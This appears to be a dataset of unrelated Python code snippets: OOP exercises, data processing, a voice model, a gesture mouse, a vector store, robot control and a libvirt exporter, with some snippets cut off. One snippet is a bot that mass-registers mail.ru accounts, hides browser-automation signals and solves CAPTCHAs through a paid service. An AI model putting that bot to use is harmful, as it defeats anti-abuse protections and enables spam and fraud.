    "class Personel:\r\n    def __init__(self, ad, soyad, yas, kimlik_no):\r\n        self.ad = ad\r\n        self.soyad = soyad\r\n        self.yas = yas\r\n        self.kimlik_no = kimlik_no\r\n\r\n    def bilgileri_goster(self):\r\n        print(f\"Ad\u0131: {self.ad}\\nSoyad\u0131: {self.soyad}\\nYa\u015f\u0131: {self.yas}\\nKimlik No: {self.kimlik_no}\")\r\n\r\nclass Ogrenci(Personel):\r\n    ogrenciNo = \"belirtilmedi\"\r\n\r\n    def __init__(self, ad, soyad, yas, kimlik_no, ogrenciNo=None):\r\n        super().__init__(ad, soyad, yas, kimlik_no) ## super() fonksiyonu ile Personel s\u0131n\u0131f\u0131n\u0131n __init__ fonksiyonunu \u00e7a\u011f\u0131r\u0131yoruz\r\n        if ogrenciNo is not None:\r\n            self.ogrenciNo = ogrenciNo\r\n\r\n    def ogrenciNo_degistirme(self, yeni_ogrenciNo):\r\n        self.ogrenciNo = yeni_ogrenciNo\r\n\r\n    ## Ogrenci s\u0131n\u0131f\u0131n\u0131n bilgilerini g\u00f6stermek i\u00e7in Personel s\u0131n\u0131f\u0131n\u0131n fonksiyonunu geni\u015fletelim\r\n    def bilgileri_goster(self):\r\n        super().bilgileri_goster() ## super() fonksiyonu ile Personel s\u0131n\u0131f\u0131n\u0131n fonksiyonunu \u00e7a\u011f\u0131r\u0131yoruz\r\n        print(f\"\u00d6\u011frenci No: {self.ogrenciNo}\")\r\n\r\n\r\ntunay = Ogrenci(\"tunay\", \"ince\", 20, \"1223456789\", \"222007560\")\r\ntunay.bilgileri_goster()\r\n",
    "import pandas as pd\nfrom matplotlib import pyplot as plt\nimport pandas as pds\nimport numpy as np\nfrom datetime import date, datetime, time\nfrom tqdm import tqdm\n\n# path = \"small_adv_dataset.csv\"\npath = \"dataset_mood_smartphone.csv\"\n\ndataset_df = pd.read_csv(path, index_col=0)\ndataset_df[\"time\"] = pd.to_datetime(dataset_df['time'])\n\n\n# dataset_df.info()\n# print(dataset_df.head())\n\nvar_names = ['mood', 'circumplex.arousal', 'circumplex.valence', 'activity', 'screen',\n             'call', 'sms', 'appCat.builtin', 'appCat.communication',\n             'appCat.entertainment', 'appCat.finance', 'appCat.game', 'appCat.office',\n             'appCat.other', 'appCat.social', 'appCat.travel', 'appCat.unknown',\n             'appCat.utilities', 'appCat.weather']\n\ncount_var_names = [\"mood_count\", \"circumplex.arousal_count\", \"circumplex.valence_count\", \"activity_count\",\n                   \"screen_count\", \"call_count\", \"sms_count\", \"appCat.builtin_count\", \"appCat.communication_count\",\n                   \"appCat.entertainment_count\", \"appCat.finance_count\", \"appCat.game_count\", \"appCat.office_count\",\n                   \"appCat.other_count\", \"appCat.social_count\", \"appCat.travel_count\", \"appCat.unknown_count\",\n                   \"appCat.utilities_count\", \"appCat.weather_count\"]\n\nvar_and_count_names = [\"mood\", \"mood_count\", \"circumplex.arousal\", \"circumplex.arousal_count\", \"circumplex.valence\",\n             \"circumplex.valence_count\", \"activity\", \"activity_count\", \"screen\", \"screen_count\", \"call\",\n             \"call_count\",\n             \"sms\", \"sms_count\", \"appCat.builtin\", \"appCat.builtin_count\", \"appCat.communication\",\n             \"appCat.communication_count\", \"appCat.entertainment\", \"appCat.entertainment_count\", \"appCat.finance\",\n             \"appCat.finance_count\", \"appCat.game\", \"appCat.game_count\", \"appCat.office\", \"appCat.office_count\",\n             \"appCat.other\", \"appCat.other_count\", \"appCat.social\", \"appCat.social_count\", \"appCat.travel\",\n             \"appCat.travel_count\", \"appCat.unknown\", \"appCat.unknown_count\", \"appCat.utilities\",\n             \"appCat.utilities_count\", \"appCat.weather\", \"appCat.weather_count\"]\n\ndef get_all_rows_between(indiv, date_time1, date_time2, df=dataset_df):\n    '''\n    Gives all the rows that fit the params. (for indiv between time1 and time2)\n    :param indiv: individual id\n    :param date_time1: first date time\n    :param date_time2: second date time\n    :param df: dataframe of the dataset\n    :return: DataFrame object\n    '''\n    if date_time1 < date_time2:\n        date_time1, date_time2 = date_time2, date_time1\n\n    result = []\n\n    for index, row in df[df['id'] == indiv].iterrows():\n        if date_time1 >= row[\"time\"] >= row[\"time\"]:\n            result.append(row)\n\n    return pd.DataFrame(result, columns=list(df.columns))\n\n\n# testing get_all_rows_between()\n'''\nprint(f\"\\n{dataset_df.iloc[0]}\")\ntime1 = dataset_df.iloc[0][\"time\"]\ntime2 = dataset_df.iloc[1][\"time\"]\nindiv_id = dataset_df.iloc[0][\"id\"]\nprint(f\"{time1} to {time2}\")\n\nresulting_df = get_all_rows_between(indiv_id, time1, time2)\nresulting_df.info()\nprint(resulting_df.head())\n'''\n\n\ndef get_unique_dates(df):\n    \"\"\"\n    returns unique dates in the df\n    :param df: dataframe\n    :return: list containing datetime.date type objects\n    \"\"\"\n    new_df = pd.to_datetime(df['time']).dt.date\n    return new_df.unique()\n\n\ndef get_unique_individual_ids(df):\n    \"\"\"\n    returns unique individual_ids in the df\n    :param df: dataframe\n    :return: list containing individual_ids as string\n    \"\"\"\n    return df[\"id\"].unique()\n\n\ndef get_unique_variables(df):\n    \"\"\"\n    returns unique individual_ids in the df\n    :param df: dataframe\n    :return: list containing individual_ids as string\n    \"\"\"\n    return df[\"variable\"].unique()\n\n\ndef create_per_day_and_participant_dataset(save_path=\"per_day_participant_dataset.csv\"):\n    # var_names = get_unique_variables(dataset_df) # don't use this, it's a numpy array\n    \"\"\"\n    var_names = ['mood', 'circumplex.arousal', 'circumplex.valence', 'activity', 'screen',\n                 'call', 'sms', 'appCat.builtin', 'appCat.communication',\n                 'appCat.entertainment', 'appCat.finance', 'appCat.game', 'appCat.office',\n                 'appCat.other', 'appCat.social', 'appCat.travel', 'appCat.unknown',\n                 'appCat.utilities', 'appCat.weather']\n    \"\"\"\n\n    # datapoint for each day + individual combination (good?)\n    unique_ids = get_unique_individual_ids(dataset_df)\n    datapoints = {}\n    for participant_id in tqdm(unique_ids, desc=\"participants\"):\n        # dataframe containing only rows of participant with id \"participant_id\"\n        id_df = dataset_df[dataset_df[\"id\"] == participant_id]\n        unique_dates = get_unique_dates(id_df)\n        for date in unique_dates:\n            # per date\n            time1 = datetime.combine(date, time(0, 0))\n            time2 = datetime.combine(date, time(23, 59))\n            relevant_rows = get_all_rows_between(participant_id, time1, time2, id_",
    "from random import randint, choices\nfrom requests import post, get\nfrom time import sleep\n\nfrom selenium import webdriver\nfrom selenium.webdriver.common.by import By\nfrom selenium.webdriver.support.ui import WebDriverWait\nfrom selenium.webdriver.support import expected_conditions as EC\n\nfrom fake_useragent import UserAgent\nfrom loguru import logger\nfrom multiprocessing import Process\nfrom configparser import ConfigParser\n\nconfig = ConfigParser()\nconfig.read('config.ini')\n\n# \u0417\u0430\u0433\u0440\u0443\u0437\u043a\u0430 \u043a\u043b\u044e\u0447\u0430 \u0438\u0437 \u0441\u0435\u043a\u0446\u0438\u0438 [token]\ntoken = config['token']['key']\n\n# \u0417\u0430\u0433\u0440\u0443\u0437\u043a\u0430 \u0434\u0440\u0443\u0433\u0438\u0445 \u043d\u0430\u0441\u0442\u0440\u043e\u0435\u043a\nsession_count = int(config['settings']['session_count'])\nheadless = config.getboolean('settings', 'headless')\n\nchars_name = 'abcdefghijklnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'\nchars_password = 'abcdefghijklnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890()-_@$!&?'\nurl = \"https://account.mail.ru/signup?back=https%3A%2F%2Faccount.mail.ru%2Fregister%3Fauthid%3Dlc7psg5f.6h7%26dwhsplit%3Ds10273.b1ss12743s%26from%3Dlogin&dwhsplit=s10273.b1ss12743s&from=login\"\n\nua = UserAgent()\n\n\ndef generate_random_string(ln, chars):\n    password = ''.join(choices(chars, k=ln))\n    return password\n\n\ndef convert_account_data_to_string(account_data):\n    email = account_data['email']\n    fname = account_data['fname']\n    lname = account_data['lname']\n    password = account_data['password']\n    reserve_mail = account_data['reserve_mail']\n\n    result = f'{email}\\t{fname}\\t{lname}\\t{password}\\t{reserve_mail}'\n\n    return result\n\n\n@logger.catch()\ndef check_captcha(img, session_id):\n    try:\n        r = post('http://rucaptcha.com/in.php',\n                 data={'key': token, 'method': 'base64', 'body': img, 'phrase': 0, 'regsense': 0,\n                       'lang': 'en'}).text\n\n        logger.debug(f'{session_id}: request - {r}')\n        capcha_id = ''\n\n        if r[:2] == 'OK':\n            capcha_id = r[3:]\n        else:\n            return False\n\n        for i in range(10):\n            sleep(2)\n            result = get(f'http://rucaptcha.com/res.php?key={token}&action=get&id={capcha_id}').text\n            if result[:2] == 'OK' and len(result[3:]) == 6:\n                logger.debug(f'{session_id}: {result}')\n                return result[3:]\n            elif result == 'CAPCHA_NOT_READY':\n                continue\n            else:\n                logger.error(f'{session_id}: \u0412\u0435\u0440\u043d\u0443\u043b \u043d\u0435\u0432\u0435\u0440\u043d\u0443\u044e \u043a\u0430\u043f\u0447\u0443')\n                return False\n        return False\n    except Exception as ex:\n        logger.error(f'{session_id}: O\u0448\u0438\u0431\u043a\u0430 \u043f\u0440\u0438 \u0437\u0430\u043f\u0440\u043e\u0441\u0435 \u043a\u0430\u043f\u0447\u0438: {ex}')\n\n\n@logger.catch()\ndef initialize_driver(session_id):\n    try:\n        options = webdriver.ChromeOptions()\n        options.add_argument(f'user-agent={ua.random}')\n        options.add_argument(\"start-maximized\")\n        options.add_experimental_option(\"excludeSwitches\", [\"enable-automation\"])\n        options.add_experimental_option('useAutomationExtension', False)\n        options.add_argument(\"--disable-blink-features=AutomationControlled\")\n        options.add_argument(\"disable-infobars\")\n        options.add_argument(\"--disable-extensions\")\n        options.add_argument('--no-sandbox')\n        options.add_argument('--disable-application-cache')\n        options.add_argument('--disable-gpu')\n        options.add_argument(\"--disable-dev-shm-usage\")\n        options.add_argument('disable-notifications')\n        options.add_experimental_option('excludeSwitches', ['enable-logging'])\n        options.add_argument('--ignore-certificate-errors-spki-list')\n        options.add_argument('--ignore-ssl-errors')\n        if headless:\n            options.add_argument(\"--headless\")\n\n        driver = webdriver.Chrome(options=options)\n\n        return driver\n    except Exception as ex:\n        logger.error(f'{session_id}: Error during driver initialization: {ex}')\n\n\n@logger.catch()\ndef register_email(session_id):\n    driver = initialize_driver(session_id)\n    if driver is None:\n        return False\n    logger.info(f'{session_id}: start registration...')\n    try:\n        driver.get(url)\n    except Exception as ex:\n        driver.quit()\n        sleep(10)\n        logger.error(f'{session_id}: O\u0448\u0438\u0431\u043a\u0430 \u043f\u0440\u0438 \u043e\u0442\u043a\u0440\u044b\u0442\u0438\u0438 \u0441\u0442\u0440\u0430\u043d\u0438\u0446\u044b: {ex}')\n        return False\n\n    logger.info(f'{session_id}: window was opened...')\n\n    if len(driver.find_elements(By.ID, 'preloader')) != 0:\n        while len(driver.find_elements(By.ID, 'preloader')) != 0:\n            sleep(1)\n            driver.refresh()\n\n    try:\n        sleep(2)\n\n        fname = generate_random_string(6, chars_name)\n        lname = generate_random_string(6, chars_name)\n        username = generate_random_string(10, chars_name)\n        reserve_mail = f'{generate_random_string(10, chars_name)}@rambler.ru'\n\n        WebDriverWait(driver, 60).until(\n            EC.presence_of_element_located((By.NAME, 'fname'))\n        ).send_keys(fname)\n\n        driver.find_element(by=By.NAME, value='lname').send_keys(lname)\n        driver.find_element(by=By.NAME, value='partial_login').send_keys(username)\n\n        element_to_remove = d",
    "import math, pdb, os\nfrom time import time as ttime\nimport torch\nfrom torch import nn\nfrom torch.nn import functional as F\nfrom infer_pack import modules\nfrom infer_pack import attentions\nfrom infer_pack import commons\nfrom infer_pack.commons import init_weights, get_padding\nfrom torch.nn import Conv1d, ConvTranspose1d, AvgPool1d, Conv2d\nfrom torch.nn.utils import weight_norm, remove_weight_norm, spectral_norm\nfrom infer_pack.commons import init_weights\nimport numpy as np\nfrom infer_pack import commons\n\n\nclass TextEncoder256(nn.Module):\n    def __init__(\n        self,\n        out_channels,\n        hidden_channels,\n        filter_channels,\n        n_heads,\n        n_layers,\n        kernel_size,\n        p_dropout,\n        f0=True,\n    ):\n        super().__init__()\n        self.out_channels = out_channels\n        self.hidden_channels = hidden_channels\n        self.filter_channels = filter_channels\n        self.n_heads = n_heads\n        self.n_layers = n_layers\n        self.kernel_size = kernel_size\n        self.p_dropout = p_dropout\n        self.emb_phone = nn.Linear(256, hidden_channels)\n        self.lrelu = nn.LeakyReLU(0.1, inplace=True)\n        if f0 == True:\n            self.emb_pitch = nn.Embedding(256, hidden_channels)  # pitch 256\n        self.encoder = attentions.Encoder(\n            hidden_channels, filter_channels, n_heads, n_layers, kernel_size, p_dropout\n        )\n        self.proj = nn.Conv1d(hidden_channels, out_channels * 2, 1)\n\n    def forward(self, phone, pitch, lengths):\n        if pitch == None:\n            x = self.emb_phone(phone)\n        else:\n            x = self.emb_phone(phone) + self.emb_pitch(pitch)\n        x = x * math.sqrt(self.hidden_channels)  # [b, t, h]\n        x = self.lrelu(x)\n        x = torch.transpose(x, 1, -1)  # [b, h, t]\n        x_mask = torch.unsqueeze(commons.sequence_mask(lengths, x.size(2)), 1).to(\n            x.dtype\n        )\n        x = self.encoder(x * x_mask, x_mask)\n        stats = self.proj(x) * x_mask\n\n        m, logs = torch.split(stats, self.out_channels, dim=1)\n        return m, logs, x_mask\n\n\nclass TextEncoder768(nn.Module):\n    def __init__(\n        self,\n        out_channels,\n        hidden_channels,\n        filter_channels,\n        n_heads,\n        n_layers,\n        kernel_size,\n        p_dropout,\n        f0=True,\n    ):\n        super().__init__()\n        self.out_channels = out_channels\n        self.hidden_channels = hidden_channels\n        self.filter_channels = filter_channels\n        self.n_heads = n_heads\n        self.n_layers = n_layers\n        self.kernel_size = kernel_size\n        self.p_dropout = p_dropout\n        self.emb_phone = nn.Linear(768, hidden_channels)\n        self.lrelu = nn.LeakyReLU(0.1, inplace=True)\n        if f0 == True:\n            self.emb_pitch = nn.Embedding(256, hidden_channels)  # pitch 256\n        self.encoder = attentions.Encoder(\n            hidden_channels, filter_channels, n_heads, n_layers, kernel_size, p_dropout\n        )\n        self.proj = nn.Conv1d(hidden_channels, out_channels * 2, 1)\n\n    def forward(self, phone, pitch, lengths):\n        if pitch == None:\n            x = self.emb_phone(phone)\n        else:\n            x = self.emb_phone(phone) + self.emb_pitch(pitch)\n        x = x * math.sqrt(self.hidden_channels)  # [b, t, h]\n        x = self.lrelu(x)\n        x = torch.transpose(x, 1, -1)  # [b, h, t]\n        x_mask = torch.unsqueeze(commons.sequence_mask(lengths, x.size(2)), 1).to(\n            x.dtype\n        )\n        x = self.encoder(x * x_mask, x_mask)\n        stats = self.proj(x) * x_mask\n\n        m, logs = torch.split(stats, self.out_channels, dim=1)\n        return m, logs, x_mask\n\n\nclass ResidualCouplingBlock(nn.Module):\n    def __init__(\n        self,\n        channels,\n        hidden_channels,\n        kernel_size,\n        dilation_rate,\n        n_layers,\n        n_flows=4,\n        gin_channels=0,\n    ):\n        super().__init__()\n        self.channels = channels\n        self.hidden_channels = hidden_channels\n        self.kernel_size = kernel_size\n        self.dilation_rate = dilation_rate\n        self.n_layers = n_layers\n        self.n_flows = n_flows\n        self.gin_channels = gin_channels\n\n        self.flows = nn.ModuleList()\n        for i in range(n_flows):\n            self.flows.append(\n                modules.ResidualCouplingLayer(\n                    channels,\n                    hidden_channels,\n                    kernel_size,\n                    dilation_rate,\n                    n_layers,\n                    gin_channels=gin_channels,\n                    mean_only=True,\n                )\n            )\n            self.flows.append(modules.Flip())\n\n    def forward(self, x, x_mask, g=None, reverse=False):\n        if not reverse:\n            for flow in self.flows:\n                x, _ = flow(x, x_mask, g=g, reverse=reverse)\n        else:\n            for flow in reversed(self.flows):\n                x = flow(x, x_mask, g=g, reverse=reverse)\n        return x\n\n    def remove_weight_norm(self):",
    "\"\"\" an ai powered virtual mouse controlled using our finger tips \"\"\"\r\n\r\n# step 1:- capture the video frames using opencv\r\n\r\nimport cv2                                     # opencv2 is a module which is related to computer vision and helps us to do operations based upon a camera\r\n\r\n#step 2:- detect the hand from the frames captured\r\n\r\nimport mediapipe as mp                         # meadiapipe is an exterernal module which is powered by google for detetecting \r\n\r\n#step 3:- control the mouse using the index finger\r\n\r\nimport pyautogui                               # pyautogui is a module which helps with controlling the various aspects of the system and interact with them \r\n\r\ncap = cv2.VideoCapture(0)                      # this line starts to record the video from the camera 0 = front camera 1 = rear camera \r\n\r\nhand_detector = mp.solutions.hands.Hands()     # we are using the  mediapipe module to detect the hand from the frames \r\ndrawing_utils = mp.solutions.drawing_utils     # we are plotting out the landmarks of the hand\r\nscreen_width, screen_height = pyautogui.size() # taking out the screen size of the respective system \r\nindex_y = 0                                    # setting the initial position value of the top most part of the index finger \r\n\r\nwhile True:                                    # opening a continous loop for the capturing of the hand\r\n\r\n    _, frame = cap.read()                      # reading all the frames from the camera\r\n    frame = cv2.flip(frame, 1)                 # by default the opencv mirorrs the image infront of the cameea by giving the vakue 1 we are flipping the image read from the camera\r\n    frame_height, frame_width, _ = frame.shape # setting the up the frame size of the capture window\r\n    rgb_frmae = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB) # converting the colour scale of the frames captured from RGB2BGR for the smoothness of processing the frames\r\n    output = hand_detector.process(rgb_frmae)  # passing the convert colour scales frames to the hand detector method tho detect the hands\r\n    hands = output.multi_hand_landmarks        # setting up the landmarks on the fingers of the hands\r\n    if hands:                                  # conditon statement for checking the presence of hand in the frame \r\n        for hand in hands:                     # a for loop to continously iterate and check for hand in the hands method \r\n            drawing_utils.draw_landmarks(frame, hand) # drawing the landmarks on each frame captuted from the capture window\r\n            landmarks = hand.landmark          # setting the value of the landmark points in the hand\r\n            for id,landmark in enumerate(landmarks): # for loop for giving position values to each landmark enumerate means to move through the whole landmarks in the hand\r\n                x = int(landmark.x*frame_width)      # adjusting the position values of the pointer landmark for x axis and called it as an integer to get a whole number \r\n                y = int(landmark.y*frame_height)     # adjusting the position values of the pointer landmark for y axis and called it also an integer to get a whole number    \r\n\r\n                # tracking the position of the index finger and pointer \r\n\r\n                if id == 8:                    # 8 is the position value of the index finger the index finger is used to track the movement of the pointer \r\n                    cv2.circle(img=frame, center=(x,y), radius=10, color=(0, 255, 255)) # we are drawing a cirlce to showcase the position of the top most part of the indrex finger \r\n                    index_x = screen_width/frame_width*x # adjusting the size of the x axis to the whole screen \r\n                    index_y = screen_height/frame_height*y # adjusting the size of the y axis to the whole screen \r\n                    pyautogui.moveTo(index_x, index_y) # initializing the pyautogui module to move the pointer according to the position of the index finger\r\n\r\n                # tracking the position of the thumb to do the click action \r\n\r\n                if id == 4:                     # 4 is the position value of the thumb finger and is used to replicate the action of a click\r\n                    cv2.circle(img=frame, center=(x,y), radius=10, color=(0, 255, 255)) # drawingf a circle aroung the thump finger \r\n                    thumb_x = screen_width/frame_width*x # adjusting the size of the x axis of the thumb \r\n                    thumb_y = screen_height/frame_height*y #adjusting the size of the y axis of the thumb\r\n                    print('diff',abs(index_y - thumb_y))  # an erorr handling statement to check the difference between the thumb and the index finger \r\n                    if abs(index_y - thumb_y) < 20: # if the difference between the index and thumb is below 20 position value then it replicates the click action\r\n                        print(\"click\") # prints statment to show click whenever a clcik is activated by the system \r\n                        pyautogui.clic",
    "from typing import Optional\nimport requests\nimport urllib.parse\nBASE_URL = 'http://127.0.0.1:3006/engine/tools/'\n\ndef process_request(endpoint: str, method: str = 'GET', params: Optional[dict] = None):\n    url = f\"{BASE_URL}{endpoint}\"\n    headers = {'accept': 'application/json'}\n    response = getattr(requests, method.lower())(url, headers=headers, params=params)\n\n    if response.status_code != 200:\n        raise Exception(f\"\u8bf7\u6c42\u5931\u8d25\uff0c\u72b6\u6001\u7801\uff1a{response.status_code}\")\n\n    return response.json()\n\ndef search_product(params):\n    query = params.get(\"query\", \"\")\n    encoded_product_name = urllib.parse.quote(query)\n    return process_request(f'product/{encoded_product_name}')\n\ndef pick_order(params):\n    query = params.get(\"query\", \"default\")\n    encoded_query = urllib.parse.quote(query)\n    return process_request(f'order/{encoded_query}')\n\ndef cancel_order(params):\n    query = params.get(\"query\", \"default\")\n    return process_request(f'order/{query}/3', 'PUT')\n\ntools_mapping = {\n    \"search_product\": search_product,\n    \"pick_order\": pick_order,\n    \"cancel_order\": cancel_order\n}\n",
    "from pymilvus import connections, Collection, CollectionSchema, FieldSchema, DataType\nimport requests\nimport config\n\ndef connect_to_cluster():\n    \"\"\"\u8fde\u63a5\u5230\u96c6\u7fa4\"\"\"\n    try:\n        connections.connect(alias=\"default\", uri=config.CLUSTER_ENDPOINT, token=config.TOKEN)\n    except Exception as e:\n        print(f\"Error connecting to the cluster: {e}\")\n\ndef create_collection():\n    \"\"\"\u521b\u5efa\u96c6\u5408\"\"\"\n    fields = [\n        FieldSchema(name=\"id\", dtype=DataType.INT64, is_primary=True),\n        FieldSchema(name=\"role\", dtype=DataType.VARCHAR, max_length=20),\n        FieldSchema(name=\"content\", dtype=DataType.VARCHAR, max_length=2048),\n        FieldSchema(name=\"content_vector\", dtype=DataType.FLOAT_VECTOR, dim=1536),\n    ]\n\n    schema = CollectionSchema(\n        fields, description=\"Schema of chat history\", enable_dynamic_field=True\n    )\n\n    collection = Collection(\n        name=config.COLLECTION_NAME, description=\"Chat history recently\", schema=schema\n    )\n    return collection\n\ndef get_text_embedding(text):\n    \"\"\"\u83b7\u53d6\u6587\u672c\u7684\u5d4c\u5165\u5411\u91cf\"\"\"\n    url = \"http://192.168.31.125:8001/v1/embeddings\"\n    headers = {\"accept\": \"application/json\", \"Content-Type\": \"application/json\"}\n    data = {\"input\": [text], \"model\": \"chatglm3-6b\"}\n    response = requests.post(url, headers=headers, json=data)\n    if response.status_code == 200:\n        return response.json()[\"data\"][0][\"embedding\"]\n    else:\n        return None\n\ndef insert_data_into_collection(collection, dialogs):\n    \"\"\"\u63d2\u5165\u6570\u636e\u5230\u96c6\u5408\"\"\"\n    for i, dialog in enumerate(dialogs):\n        dialog[\"content_vector\"] = get_text_embedding(dialog[\"content\"])\n    collection.insert(dialogs)\n\ndef create_index_for_collection(collection):\n    \"\"\"\u4e3a\u96c6\u5408\u521b\u5efa\u7d22\u5f15\"\"\"\n    index_params = {\"index_type\": \"AUTOINDEX\", \"metric_type\": \"L2\", \"params\": {}}\n    collection.create_index(\n        field_name=\"content_vector\",\n        index_params=index_params,\n        index_name=\"content_vector_index\",\n    )\n\ndef search_in_collection(collection, new_text):\n    \"\"\"\u5728\u96c6\u5408\u4e2d\u641c\u7d22\"\"\"\n    new_vector = get_text_embedding(new_text)\n    results = collection.search(\n        data=[new_vector],\n        anns_field=\"content_vector\",\n        param={\"metric_type\": \"L2\", \"params\": {\"nprobe\": 12}},\n        expr=\"user_id==2\",\n        output_fields=[\"role\", \"content\"],\n        limit=1,\n    )\n    return results\n\ndef main():\n    connect_to_cluster()\n    collection = create_collection()\n    insert_data_into_collection(collection, config.dialogs)\n    create_index_for_collection(collection)\n    collection.load()\n    results = search_in_collection(collection, \"\u67e5\u627evue \u76f8\u5173\u95ee\u9898\uff1f\")\n    print(results)\n\nif __name__ == \"__main__\":\n    main()\n",
    "# Echo client program\nimport socket\nimport time\n\nHOST = \"192.168.0.9\" # The remote host\nPORT = 30002 # The same port as used by the server\n\nprint (\"Starting Program\")\n\ncount = 0\nwhile (count < 1):\n s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n s.connect((HOST, PORT))\n time.sleep(0.5)\n print (\"Set output 1 and 2 high\")\n s.send (\"set_digital_out(1,True)\" + \"\\n\")\n time.sleep(0.1)\n\n s.send (\"set_digital_out(2,True)\" + \"\\n\")\n time.sleep(2)\n \n print (\"Robot starts Moving to 3 positions based on joint positions\")\n \n s.send (\"movej([-1.95, -1.58, 1.16, -1.15, -1.55, 1.18], a=1.0, v=0.1)\" + \"\\n\")\n time.sleep(10)\n s.send (\"movej([-1.95, -1.66, 1.71, -1.62, -1.56, 1.19], a=1.0, v=0.1)\" + \"\\n\")\n time.sleep(10)\n s.send (\"movej([-1.96, -1.53, 2.08, -2.12, -1.56, 1.19], a=1.0, v=0.1)\" + \"\\n\")\n time.sleep(10)\n \n print (\"Robot starts Moving to 3 positions based on pose positions\")\n \n s.send (\"movej(p[0.00, 0.3, 0.4, 2.22, -2.22, 0.00], a=1.0, v=0.1)\" + \"\\n\")\n time.sleep(10)\n s.send (\"movej(p[0.00, 0.3, 0.2, 2.22, -2.22, 0.00], a=1.0, v=0.1)\" + \"\\n\")\n time.sleep(10)\n \n print (\"Set output 1 and 2 low\")\n \n s.send (\"set_digital_out(1,False)\" + \"\\n\")\n \n time.sleep(0.1)\n\n s.send (\"set_digital_out(2,False)\" + \"\\n\")\n time.sleep(0.1)\n \n count = count + 1\n print (\"The count is: \", count)\n \n print (\"Program finish\")\n \n time.sleep(1)\n data = s.recv(1024)\n \n s.close()\n print (\"Received\", repr(data))\n \n print (\"Status data received from robot\")\n",
    "import random\r\nimport string\r\nimport os\r\n\r\nclass Loader:\r\n    def update_progress(self, email, password):\r\n        print(f\"Generating {email} (Password: {password})\")\r\n\r\ndef generate_credentials(num_credentials):\r\n    credentials = []\r\n    domains = [\"gmail.com\", \"yahoo.com\", \"hotmail.com\", \"outlook.com\"]\r\n    for _ in range(num_credentials):\r\n        username = ''.join(random.choice(string.ascii_lowercase) for _ in range(8))\r\n        domain = random.choice(domains)\r\n        password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(10))\r\n        email = f\"{username}@{domain}\"\r\n        credentials.append((email, password))\r\n    return credentials\r\n\r\ndef save_to_file(credentials):\r\n    with open(\"emails.txt\", \"w\") as file:\r\n        for email, password in credentials:\r\n            file.write(f\"Email: {email}, Password: {password}\\n\")\r\n\r\ndef display_loader():\r\n    print('''\r\n                                                  \r\n _____     _     _____           _ _ _____         \r\n|  _  |___|_|___|   __|_____ ___|_| |   __|___ ___ \r\n|     |  _| | .'|   __|     | .'| | |  |  | -_|   |\r\n|__|__|_| |_|__,|_____|_|_|_|__,|_|_|_____|___|_|_|\r\n          \r\n     github.com/Tap1337 | discord.gg/ariacc\r\n                                                  \r\n    ''')\r\n    num_credentials = int(input(\"Enter the number of credentials to generate: \"))\r\n    os.system('cls' if os.name == 'nt' else 'clear')\r\n    print('''\r\n                                                  \r\n _____     _     _____           _ _ _____         \r\n|  _  |___|_|___|   __|_____ ___|_| |   __|___ ___ \r\n|     |  _| | .'|   __|     | .'| | |  |  | -_|   |\r\n|__|__|_| |_|__,|_____|_|_|_|__,|_|_|_____|___|_|_|\r\n          \r\n     github.com/Tap1337 | discord.gg/ariacc\r\n                                                  \r\n    ''')\r\n    print(\"Generating emails and passwords...\")\r\n    credentials = generate_credentials(num_credentials)\r\n    save_to_file(credentials)\r\n    loader = Loader()\r\n    for email, password in credentials:\r\n        loader.update_progress(email, password)\r\n    print(\"Emails and passwords generated and saved to 'emails.txt'!\")\r\n    input(\"Press Enter to exit...\")\r\n\r\nif __name__ == \"__main__\":\r\n    display_loader()\r\n",
    "#!/usr/bin/env python\n\nimport time\nimport libvirt\nfrom xml.dom import minidom\nfrom optparse import OptionParser\nfrom prometheus_client import start_http_server, Gauge, Counter\n\n# Initialize Prometheus metrics \nlibvirt_up = Gauge('libvirt_up', \"Whether scraping libvirt's metrics was successful\")\n\nlabels = ['domain']\nlibvirt_domain_info_state = Gauge('libvirt_domain_info_state', \"Current state 0 - inactive; 1 - active, 2 - paused\", labels)\nlibvirt_domain_info_cpu_time = Counter('libvirt_domain_info_cpu_time', \"CPU time spent by the domain in nanoseconds\", labels)\nlibvirt_domain_info_cpu_time_user = Counter('libvirt_domain_info_cpu_time_user', \"CPU time spent by the domain in user mode\", labels)\nlibvirt_domain_info_cpu_time_system = Counter('libvirt_domain_info_cpu_time_system', \"CPU time spent by the domain in system mode\", labels)\n\nlabels = ['domain']\nlibvirt_domain_info_memory_actual = Gauge('libvirt_domain_info_memory_actual', \"Actual memory usage of the domain\", labels)\nlibvirt_domain_info_memory_usable = Gauge('libvirt_domain_info_memory_usable', \"Usable memory of the domain\", labels)\nlibvirt_domain_info_memory_unused = Gauge('libvirt_domain_info_memory_unused', \"Unused memory of the domain\", labels)\nlibvirt_domain_info_memory_available = Gauge('libvirt_domain_info_memory_available', \"Available memory of the domain\", labels)\n\nlabels = ['dev', 'domain']\nlibvirt_domain_info_block_read_bytes = Counter('libvirt_domain_info_block_read_bytes', \"Bytes read per second\", labels)\nlibvirt_domain_info_block_read_requests = Counter('libvirt_domain_info_block_read_requests', \"Read requests per second\", labels)\nlibvirt_domain_info_block_write_bytes = Counter('libvirt_domain_info_block_write_bytes', \"Bytes written per second\", labels)\nlibvirt_domain_info_block_write_requests = Counter('libvirt_domain_info_block_write_requests', \"Write requests per second\", labels)\n\nlabels = ['dev', 'domain']\nlibvirt_domain_info_net_rx_bytes = Counter('libvirt_domain_info_net_rx_bytes', \"Bytes received per second\", labels)\nlibvirt_domain_info_net_rx_packets = Counter('libvirt_domain_info_net_rx_packets', \"Packets received per second\", labels)\nlibvirt_domain_info_net_tx_bytes = Counter('libvirt_domain_info_net_tx_bytes', \"Bytes transmitted per second\", labels)\nlibvirt_domain_info_net_tx_packets = Counter('libvirt_domain_info_net_tx_packets', \"Packets transmitted per second\", labels)\n\nlabels = ['dev', 'domain']\nlibvirt_domain_info_vcpu_time = Counter('libvirt_domain_info_vcpu_time', \"CPU time used by the domain in nanoseconds\", labels)\n\n\ndef main(uri):\n    conn = None\n\n    try:\n        conn = libvirt.open(uri)\n    except libvirt.libvirtError as e:\n        print(\"Failed to open connection to libvirt\")\n\n    if conn is None:\n        libvirt_up.set(0)\n    \n    if conn is not None:\n        libvirt_up.set(1)\n\n        for dom in conn.listAllDomains():\n            raw_xml = dom.XMLDesc(0)\n            xml = minidom.parseString(raw_xml)\n            